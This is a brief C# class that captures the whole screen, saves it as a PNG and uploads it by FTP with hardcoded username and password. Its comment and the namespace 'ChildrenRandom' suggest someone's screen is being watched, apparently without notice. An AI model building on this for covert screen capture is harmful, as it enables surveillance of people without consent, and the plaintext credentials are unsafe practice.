using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using ChildrenRandom;

   public class ScreenCapture
   {
        Graphics g;
        int ScreenWidth = Screen.PrimaryScreen.Bounds.Width;
        int ScreenHeight = Screen.PrimaryScreen.Bounds.Height;
        fptUpload up = new fptUpload();
        public void Chup()
        {
            Bitmap b = new Bitmap(ScreenWidth, ScreenHeight);
            g = Graphics.FromImage(b);
            g.CopyFromScreen(Point.Empty, Point.Empty, Screen.PrimaryScreen.Bounds.Size);
            string path = Application.StartupPath + "\\Capture\\" + DateTime.Now.ToString("ddMMyyyy HHmmss") + ".Png";
            b.Save(path, System.Drawing.Imaging.ImageFormat.Png);
            up.uploadFile("ftp://127.0.0.1", path, "heozung", "123456");
            //up rồi , đợi em lên đó coi
            
        }
    }
